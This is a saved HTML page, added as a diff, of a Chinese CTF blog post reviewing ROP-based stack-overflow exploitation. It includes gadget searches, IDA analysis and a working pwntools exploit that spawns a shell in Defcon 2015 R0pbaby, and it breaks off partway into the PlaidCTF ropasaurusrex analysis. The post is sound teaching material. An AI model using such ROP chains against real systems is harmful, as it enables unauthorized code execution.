@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<title>基础栈溢出复习 二 之 ROP | Swings'Blog|浮生若梦|CTFer|Binary|Python</title>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
+<meta content="最近在准备面试 所以在复习一些东西! 这个篇目主要介绍栈溢出的攻击方法，以及一些题目分析。" name="description"/>
+<meta content="article" property="og:type"/>
+<meta content="基础栈溢出复习 二 之 ROP" property="og:title"/>
+<meta content="http://bestwing.me/2017/03/19/stack-overflow-two/index.html" property="og:url"/>
+<meta content="Swings'Blog|浮生若梦|CTFer|Binary|Python" property="og:site_name"/>
+<meta content="最近在准备面试 所以在复习一些东西! 这个篇目主要介绍栈溢出的攻击方法，以及一些题目分析。" property="og:description"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-3-19/99024363-file_1489924557341_12abd.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-3-19/93425120-file_1489924829581_140e8.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-3-19/52506941-file_1489925167605_4720.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-3-19/91145235-file_1489925434757_5222.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-3-19/12833288-file_1489932945509_4841.png" property="og:image"/>
+<meta content="2017-04-07T13:20:13.002Z" property="og:updated_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="基础栈溢出复习 二 之 ROP" name="twitter:title"/>
+<meta content="最近在准备面试 所以在复习一些东西! 这个篇目主要介绍栈溢出的攻击方法，以及一些题目分析。" name="twitter:description"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-3-19/99024363-file_1489924557341_12abd.png" name="twitter:image"/>
+<link href="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/atom.xml" rel="alternative" title="Swings'Blog|浮生若梦|CTFer|Binary|Python" type="application/atom+xml"/>
+<link href="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/98028288-file_1488275496708_10f1d.jpg" rel="icon"/>
+<link href="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/animate.min.css" rel="stylesheet"/>
+<link href="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/style.css" rel="stylesheet"/>
+<link href="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/font-awesome.min.css" rel="stylesheet"/>
+<link href="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/apple-touch-icon.png" rel="apple-touch-icon"/>
+<link href="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/jquery.fancybox.css" rel="stylesheet"/>
+<!-- 加载特效 -->
+<script src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/pace.js"></script>
+<link href="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/pace-theme-flash.css" rel="stylesheet">
+<script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</link></head>
+<body>
+<div id="container">
+<div class="left-col">
+<div class="overlay"></div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="js-avatar" lazy-src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/180526%20"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/">Swing|浮生若梦</a></h1>
+</hgroup>
+<p class="header-subtitle">努力是为了 站在万人中央 成为别人的光</p>
+<div class="switch-btn" id="switch-btn">
+<div class="icon">
+<div class="icon-ctn">
+<div class="icon-wrap icon-house" data-idx="0">
+<div class="birdhouse"></div>
+<div class="birdhouse_holes"></div>
+</div>
+<div class="icon-wrap icon-ribbon hide" data-idx="1">
+<div class="ribbon"></div>
+</div>
+<div class="icon-wrap icon-link hide" data-idx="2">
+<div class="loopback_l"></div>
+<div class="loopback_r"></div>
+</div>
+<div class="icon-wrap icon-me hide" data-idx="3">
+<div class="user"></div>
+<div class="shoulder"></div>
+</div>
+</div>
+</div>
+<div class="tips-box hide">
+<div class="tips-arrow"></div>
+<ul class="tips-inner">
+<li>菜单</li>
+<li>标签</li>
+<li>友情链接</li>
+<li>关于我</li>
+</ul>
+</div>
+</div>
+<div class="switch-area" id="switch-area">
+<div class="switch-wrap">
+<section class="switch-part switch-part1">
+<nav class="header-menu">
+<ul>
+<li><a href="http://bestwing.me">博客首页</a></li>
+<li><a href="/archives/">文章归档</a></li>
+<li><a href="/about">留言打卡</a></li>
+<li><a href="/CTF-Study">学习导航</a></li>
+<li><a href="/PWNABLE">PWNABLE</a></li>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fl mail" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" target="_blank" title="mail">mail</a>
+<a class="fl github" href="https://github.com/WinMin" target="_blank" title="github">github</a>
+<a class="fl zhihu" href="https://www.zhihu.com/people/swing-57-29/activities" target="_blank" title="zhihu">zhihu</a>
+<a class="fl twitter" href="https://twitter.com/bestswngs" target="_blank" title="twitter">twitter</a>
+<a class="fl rss" href="/atom.xml" target="_blank" title="rss">rss</a>
+</ul>
+</nav>
+</section>
+<section class="switch-part switch-part2">
+<div class="widget tagcloud" id="js-tagcloud">
+<a href="/tags/0CTF/" style="font-size: 10px;">0CTF</a> <a href="/tags/360春秋杯/" style="font-size: 10px;">360春秋杯</a> <a href="/tags/Bin/" style="font-size: 10px;">Bin</a> <a href="/tags/Book/" style="font-size: 10px;">Book</a> <a href="/tags/CCTF/" style="font-size: 10px;">CCTF</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12px;">Crypto</a> <a href="/tags/DEFCON/" style="font-size: 10px;">DEFCON</a> <a href="/tags/ELF/" style="font-size: 10px;">ELF</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/Hexo/" style="font-size: 18px;">Hexo</a> <a href="/tags/John/" style="font-size: 10px;">John</a> <a href="/tags/Kcon/" style="font-size: 10px;">Kcon</a> <a href="/tags/Linux-kernel/" style="font-size: 16px;">Linux-kernel</a> <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/Misc/" style="font-size: 10px;">Misc</a> <a href="/tags/NJCTF/" style="font-size: 10px;">NJCTF</a> <a href="/tags/NUCA/" style="font-size: 12px;">NUCA</a> <a href="/tags/PCTF/" style="font-size: 10px;">PCTF</a> <a href="/tags/Pwn/" style="font-size: 20px;">Pwn</a> <a href="/tags/Pwntools/" style="font-size: 10px;">Pwntools</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/Reverse/" style="font-size: 18px;">Reverse</a> <a href="/tags/SSTF/" style="font-size: 10px;">SSTF</a> <a href="/tags/SUCTF/" style="font-size: 10px;">SUCTF</a> <a href="/tags/Think/" style="font-size: 14px;">Think</a> <a href="/tags/Tools/" style="font-size: 10px;">Tools</a> <a href="/tags/VPN/" style="font-size: 10px;">VPN</a> <a href="/tags/Web/" style="font-size: 12px;">Web</a> <a href="/tags/WiFi/" style="font-size: 10px;">WiFi</a> <a href="/tags/Writeup/" style="font-size: 14px;">Writeup</a> <a href="/tags/angry/" style="font-size: 10px;">angry</a> <a href="/tags/exploit/" style="font-size: 10px;">exploit</a> <a href="/tags/i春秋-百度杯/" style="font-size: 14px;">i春秋-百度杯</a> <a href="/tags/i春秋-腾讯30强/" style="font-size: 12px;">i春秋-腾讯30强</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/wooyun/" style="font-size: 10px;">wooyun</a> <a href="/tags/上海省赛/" style="font-size: 10px;">上海省赛</a> <a href="/tags/华山杯CTF/" style="font-size: 10px;">华山杯CTF</a> <a href="/tags/科学上网/" style="font-size: 10px;">科学上网</a> <a href="/tags/陕西省赛/" style="font-size: 10px;">陕西省赛</a>
+</div>
+</section>
+<section class="switch-part switch-part3">
+<div id="js-friends">
+<a class="main-nav-link switch-friends-link" href="http://ring3.xyz/" target="_blank">Yllen</a>
+<a class="main-nav-link switch-friends-link" href="http://mxny.org/" target="_blank">麦香浓郁</a>
+<a class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/" target="_blank">K0sh1</a>
+<a class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/" target="_blank">信鑫</a>
+<a class="main-nav-link switch-friends-link" href="http://bystudent.com/" target="_blank">ByStundet表哥</a>
+<a class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/" target="_blank">汪神_Jarvis</a>
+<a class="main-nav-link switch-friends-link" href="http://sh3ll.me/" target="_blank">Chu</a>
+<a class="main-nav-link switch-friends-link" href="https://www.hackfun.org/" target="_blank">4ido10n</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy" target="_blank">L3m0n</a>
+<a class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/" target="_blank">muhe</a>
+<a class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/" target="_blank">_画船听雨</a>
+<a class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html" target="_blank">Virink</a>
+<a class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/" target="_blank">国光</a>
+<a class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/" target="_blank">老锥</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cizel.cn/" target="_blank">C1zel</a>
+<a class="main-nav-link switch-friends-link" href="http://1phan.cc" target="_blank">1phan</a>
+<a class="main-nav-link switch-friends-link" href="https://www.liuil.top/" target="_blank">liuil</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/" target="_blank">Ox9A82</a>
+<a class="main-nav-link switch-friends-link" href="http://burnegg.com/" target="_blank">burnegg</a>
+<a class="main-nav-link switch-friends-link" href="https://jwrsec.cn/" target="_blank">jwr-sec</a>
+<a class="main-nav-link switch-friends-link" href="http://sudalover.cn/" target="_blank">苏打</a>
+<a class="main-nav-link switch-friends-link" href="http://blog.binklac.com" target="_blank">VeroFess</a>
+<a class="main-nav-link switch-friends-link" href="http://www.bendawang.site/" target="_blank">bendawang</a>
+<a class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/" target="_blank">hook</a>
+</div>
+</section>
+<section class="switch-part switch-part4">
+<div id="js-aboutme">我想一年后再来写这个 2016年9月4日</div>
+</section>
+</div>
+</div>
+</header>
+</div>
+</div>
+<div class="mid-col">
+<nav id="mobile-nav">
+<div class="overlay">
+<div class="slider-trigger"></div>
+<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Swing|浮生若梦</a></h1>
+</div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="js-avatar" lazy-src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/180526%20"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="回到主页">Swing|浮生若梦</a></h1>
+</hgroup>
+<p class="header-subtitle">努力是为了 站在万人中央 成为别人的光</p>
+<nav class="header-menu">
+<ul>
+<li><a href="http://bestwing.me">博客首页</a></li>
+<li><a href="/archives/">文章归档</a></li>
+<li><a href="/about">留言打卡</a></li>
+<li><a href="/CTF-Study">学习导航</a></li>
+<li><a href="/PWNABLE">PWNABLE</a></li>
+<div class="clearfix"></div>
+</ul>
+</nav>
+<nav class="header-nav">
+<div class="social">
+<a class="mail" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" target="_blank" title="mail">mail</a>
+<a class="github" href="https://github.com/WinMin" target="_blank" title="github">github</a>
+<a class="zhihu" href="https://www.zhihu.com/people/swing-57-29/activities" target="_blank" title="zhihu">zhihu</a>
+<a class="twitter" href="https://twitter.com/bestswngs" target="_blank" title="twitter">twitter</a>
+<a class="rss" href="/atom.xml" target="_blank" title="rss">rss</a>
+</div>
+</nav>
+</header>
+</div>
+</nav>
+<div class="body-wrap"><article class="article article-type-post" id="post-stack-overflow-two" itemprop="blogPost" itemscope="">
+<div class="article-meta">
+<a class="article-date" href="/2017/03/19/stack-overflow-two/">
+<time datetime="2017-03-18T16:00:00.000Z" itemprop="datePublished">2017-03-19</time>
+</a>
+</div>
+<div class="article-inner">
+<input class="isFancy" type="hidden"/>
+<header class="article-header">
+<h1 class="article-title" itemprop="name">
+      基础栈溢出复习 二 之 ROP
+    </h1>
+</header>
+<div class="article-info article-info-post">
+<div class="article-category tagcloud">
+<a class="article-category-link" href="/categories/Summary/">Summary</a>
+</div>
+<div class="article-tag tagcloud">
+<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li></ul>
+</div>
+<div class="clearfix"></div>
+</div>
+<div class="article-entry" itemprop="articleBody">
+<p>&lt;–more–&gt;</p>
+<h4 id="现代栈溢出利用技术基础：ROP"><a class="headerlink" href="#现代栈溢出利用技术基础：ROP" title="现代栈溢出利用技术基础：ROP"></a>现代栈溢出利用技术基础：ROP</h4><p>承接上一个篇目，这里继续讲ROP的一些题目分析。讲真的，我这里基本上的题目以及攻击方式都来自于<em>Atum</em>师傅在X-MAN的PPT。</p>
+<h5 id="CTF中ROP的常规套路"><a class="headerlink" href="#CTF中ROP的常规套路" title="CTF中ROP的常规套路:"></a>CTF中ROP的常规套路:</h5><ul>
+<li>第一次触发漏洞，通过ROP泄漏libc的address(如puts_got)，计算system地址，然后返回到一个可以重现触发漏洞的位置(如main)，再次触发漏洞，通过ROP调用system(“/bin/sh”)</li>
+<li>直接execve(“/bin/sh”, [“/bin/sh”], NULL)，通常在静态链接时比较常用<br/>三个练习:</li>
+<li>Defcon 2015 Qualifier：R0pbaby</li>
+<li>AliCTF 2016：vss</li>
+<li>PlaidCTF 2013: ropasaurusrex<br/>相关题目我们可以在<a href="https://github.com/ctfs/" rel="external" target="_blank">CTFs</a>上找到。<h5 id="Defcon-2015-Qualifier：R0pbaby"><a class="headerlink" href="#Defcon-2015-Qualifier：R0pbaby" title="Defcon 2015 Qualifier：R0pbaby"></a>Defcon 2015 Qualifier：R0pbaby</h5></li>
+</ul>
+<p>我们拿到题目，可以先对题目进行检查，可先看看题目开启的保护<br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ checksec</div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : ENABLED</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure></p>
+<p>gdb-peda 自带的 checksec 有检测程序是否开启保护，以及所开启的保护。我们可以看到，<em>R0pbaby</em> 所开启的保护有FORTIFY以及NX，这里我们主要所收到的限制是栈上写入的数据不可执行。<br/>以及，程序可以知道是６４位的，它的传参优先由寄存器完成。<br/>接着，我们应该了解程序的流程，以及找到程序的漏洞，以及思考其利用方式。</p>
+<p><em>尝试运行程序</em><br/><img alt="" src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/99024363-file_1489924557341_12abd.png"/><br/>我们去尝试运行，摸清了基本上的程序的功能。</p>
+<ol>
+<li>功能1，可以获得libc的基址</li>
+<li>功能2，可以获得函数的地址</li>
+<li>功能3，输入的地方，感觉这个地方可能存在漏洞。</li>
+</ol>
+<p>紧接着，我们可以用IDA 分析程序了。<br/><img alt="" src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/93425120-file_1489924829581_140e8.png"/><br/>发现一个函数的不适当应用，拷贝的过程中没有判断大小，可能造成缓冲区溢出。</p>
+<hr/>
+<p>函数原型<br/>void  <em> memcpy(void</em>dest, const void * src, size_t n);<br/>由src指向地址为起始地址的连续n个字节的数据复制到以destin指向地址为起始地址的空间内。</p>
+<hr/>
+<p>savedregs是一个IDA关键字，我们可以看到 保存的堆栈帧指针和函数返回地址：在IDA中，我们可以直接单击它。<br/><img alt="" src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/52506941-file_1489925167605_4720.png"/><br/><img alt="" src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/91145235-file_1489925434757_5222.png"/></p>
+<p>buf的大小应该是8没错，之后可能造成缓冲区溢出，那么我的解题思路大概是如下：</p>
+<ol>
+<li>我们需要找到一个gadget RDI 用来起shell</li>
+<li>其次我们需要找到 “bin/sh”的地址</li>
+<li>最后，我们需要找到system函数的地址</li>
+</ol>
+<p>完成上面三个步骤，我们就可以去构造我们的ROP链来getshell。</p>
+<h5 id="如何找到-pop-rdi"><a class="headerlink" href="#如何找到-pop-rdi" title="如何找到 pop rdi"></a>如何找到 <code>pop rdi</code></h5><p>我们需要找到:<br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pop rdi</div><div class="line">ret</div></pre></td></tr></table></figure></p>
+<p>如此的指令，<br/>我们可以通过简单的objdump来寻找简单的gadget<br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">wings@sw:~/桌面/Rop$ python ROPgadget.py --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"</div><div class="line">Gadgets information</div><div class="line">0x00000000000206c1 : pop rbp ; pop r12 ; pop r13 ; ret</div><div class="line">0x00000000000b5a23 : pop rbp ; pop r12 ; pop r14 ; ret</div><div class="line">0x000000000001fb11 : pop rbp ; pop r12 ; ret</div><div class="line">0x000000000012bf16 : pop rbp ; pop r13 ; pop r14 ; ret</div><div class="line">0x0000000000020252 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</div><div class="line">0x00000000000210fe : pop rbp ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000000ccb05 : pop rbp ; pop r14 ; pop rbp ; ret</div><div class="line">0x00000000000202e6 : pop rbp ; pop r14 ; ret</div><div class="line">0x000000000006d128 : pop rbp ; pop rbp ; ret</div><div class="line">0x0000000000048438 : pop rbp ; pop rbx ; ret</div><div class="line">0x000000000001f930 : pop rbp ; ret</div><div class="line">0x00000000000ccb01 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret</div><div class="line">0x000000000006d124 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</div><div class="line">0x00000000000398c5 : pop rbx ; pop r12 ; pop rbp ; ret</div><div class="line">0x00000000000202e1 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</div><div class="line">0x00000000000206c0 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</div><div class="line">0x00000000000b5a22 : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret</div><div class="line">0x000000000001fb10 : pop rbx ; pop rbp ; pop r12 ; ret</div><div class="line">0x000000000012bf15 : pop rbx ; pop rbp ; pop r13 ; pop r14 ; ret</div><div class="line">0x000000000001f92f : pop rbx ; pop rbp ; ret</div><div class="line">0x000000000002a69a : pop rbx ; ret</div><div class="line">0x0000000000001b18 : pop rbx ; ret 0x2a63</div><div class="line">0x0000000000185240 : pop rbx ; ret 0x6f9</div><div class="line">0x000000000013c01f : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</div><div class="line">0x000000000010134b : pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret</div><div class="line">0x00000000000e9aba : pop rcx ; pop rbx ; ret</div><div class="line">0x0000000000001b17 : pop rcx ; pop rbx ; ret 0x2a63</div><div class="line">0x00000000000fc3e2 : pop rcx ; ret</div><div class="line">0x0000000000020256 : pop rdi ; pop rbp ; ret</div><div class="line">0x0000000000021102 : pop rdi ; ret</div></pre></td></tr></table></figure></p>
+<p>因为是本地测试，所以我先查看自己本地的libc.so.6<br/>确认libc.so.6<br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wings@sw:~/桌面/Rop$ ldd r0pbaby</div><div class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffd000)</div><div class="line">	libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7bd9000)</div><div class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7810000)</div><div class="line">	/lib64/ld-linux-x86-64.so.2 (0x0000555555554000)</div></pre></td></tr></table></figure></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wings@sw:~/桌面/Rop$ strings <span class="_">-a</span> -tx /lib/x86_64-linux-gnu/libc.so.6 | grep <span class="string">"/bin/sh"</span></div><div class="line"> 18c177 /bin/sh</div></pre></td></tr></table></figure>
+<p>可以知道 偏移是0x18c177</p>
+<p>至于sytem函数，程序的第二个功能已经给我们了，至此，我们可以开始构造我们的exp了.</p>
+<p>system = 0x00007FFFF784F390  #get_libc_base()<br/>rdi_gadget_offset = 0x21102<br/>bin_sh_offset = 0x18c177<br/>system_offset = 0x45390</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line">debug =<span class="number">1</span></div><div class="line"><span class="keyword">if</span> debug ==<span class="number">1</span>:</div><div class="line">  io = process(<span class="string">"./r0pbaby"</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">  io = remote(<span class="string">"127.0.0.1"</span>,<span class="number">10002</span>)</div><div class="line">  <span class="comment">#db.attach(io)</span></div><div class="line"></div><div class="line">system = <span class="number">0x00007FFFF784F390</span><span class="comment">#get_libc_base()</span></div><div class="line">rdi_gadget_offset = <span class="number">0x21102</span></div><div class="line">bin_sh_offset = <span class="number">0x18c177</span></div><div class="line">system_offset = <span class="number">0x45390</span></div><div class="line">libc_base = system - system_offset <span class="comment"># system addr - system_offset = libc_base</span></div><div class="line"><span class="keyword">print</span> <span class="string">"[+] libc base: [%x]"</span> % libc_base</div><div class="line">rdi_gadget_addr = libc_base + rdi_gadget_offset</div><div class="line"><span class="keyword">print</span> <span class="string">"[+] RDI gadget addr: [%x]"</span> % rdi_gadget_addr</div><div class="line">bin_sh_addr = libc_base + bin_sh_offset</div><div class="line"><span class="keyword">print</span> <span class="string">"[+] \"/bin/sh\" addr: [%x]"</span> % bin_sh_addr</div><div class="line">system_addr = <span class="number">0x00007FFFF784F390</span><span class="comment">#get_libc_func_addr(h, "system")</span></div><div class="line"><span class="keyword">print</span> <span class="string">"[+] system addr: [%x]"</span> % system_addr</div><div class="line"></div><div class="line">payload = <span class="string">"A"</span>*<span class="number">8</span></div><div class="line">payload += p64(rdi_gadget_addr)</div><div class="line">payload += p64(bin_sh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">io.recv(<span class="number">1024</span>)</div><div class="line">io.sendline(<span class="string">"3"</span>)</div><div class="line">io.recv(<span class="number">1024</span>)</div><div class="line">io.send(<span class="string">"%d\n"</span>%(len(payload)+<span class="number">1</span>))</div><div class="line">io.sendline(payload)</div><div class="line">io.sendline(<span class="string">"4"</span>)</div><div class="line"></div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+<p><img alt="" src="./基础栈溢出复习 二 之 ROP  Swings'Blog浮生若梦CTFerBinaryPython/12833288-file_1489932945509_4841.png"/><br/>至此 一个简单的64位程序 ROP Pwn题完成！！撒花　撒花～</p>
+<h5 id="PlaidCTF-2013-ropasaurusrex"><a class="headerlink" href="#PlaidCTF-2013-ropasaurusrex" title="PlaidCTF 2013: ropasaurusrex"></a>PlaidCTF 2013: ropasaurusrex</h5><p>上一个程序简单的调用 system + “bin/sh” 通过寄存器 gadget  “pop rdi;ret “传参起shell，接着我们来完成第二个pwn，第二个pwn的特点是，我们需要去info leak 得到信息，然后计算system 的地址。</p>
+<p>依旧是老三套，我们先分析一下程序开启的保护。<br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ checksec</div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure></p>
+<p>只开了NX 其他的都没开，我们可以应用ret2libc 的攻击方式来获取shell，所以我们得通过比如像write、puts、printf类似的函数做info leak用来计算system在内存中的地址。我们用IDA开，一边分析题目流程，一边找题目漏洞。<br/><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> <span class="number">__</span><span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></div><div class="line">{</div><div class="line">  sub_80483F4();</div><div class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"WIN\n"</span>, <span class="number">4u</span>);</div><div class="line">}</div></pre></td></tr></table></figure></p>
+<p>sub_80483F4<br/><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> sub_80483F4()</div><div class="line">{</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-88h]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</div><div class="line">}</div></pre></td></tr></table></figure></p>
+<p>很清晰，我们可以看到题目流程非常简单，就读取一定字节，然后直接打印<code>WIN\n</code>。紧接着，我们可以看到<code>read</code>函数被错误使用，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">.text:080483F2 ; ---------------------------------------------------------------------------</div><div class="line">.text:080483F3                 align 4</div><div class="line">.text:080483F4</div><div class="line">.text:080483F4 ; =============== S U B R O U T I N E =======================================</div><div class="line">.text:080483F4</div><div class="line">.text:080483F4 ; Attributes: bp-based frame</div><div class="line">.text:080483F4</div><div class="line">.text:080483F4 sub_80483F4     proc near               ; CODE XREF: main+9p</div><div class="line">.text:080483F4</div><div class="line">.text:080483F4 buf             = byte ptr -88h</div><div class="line">.text:080483F4</div><div class="line">.text:080483F4                 push    ebp</div><div class="line">.text:080483F5                 mov     ebp, esp</div><div class="line">.text:080483F7                 sub     esp, 98h</div><div class="line">.text:080483FD                 mov     dword ptr [esp+8], 100h ; nbytes</div><div class="line">.text:08048405                 lea     eax, [ebp+buf]</div><div class="line">.text:0804840B                 mov     [esp+4], eax    ; buf</div><div class="line">.text:0804840F                 mov     dword ptr [esp], 0 ; fd</div><div class="line">.text:08048416                 call    _read</div><div class="line">.text:0804841B                 leave</div><div class="line">.text:0804841C                 retn</div><div class="line">.text:0804841C sub_80483F4     endp</div><div class="line">.text:0804841C</div><div class="line">.text:0804841</div></pre></td></tr></table></figure>
+<p>buf大小只有0x88,但是却允许被读入0x100的字节大小，这明显可以造成缓冲区溢出。</p>
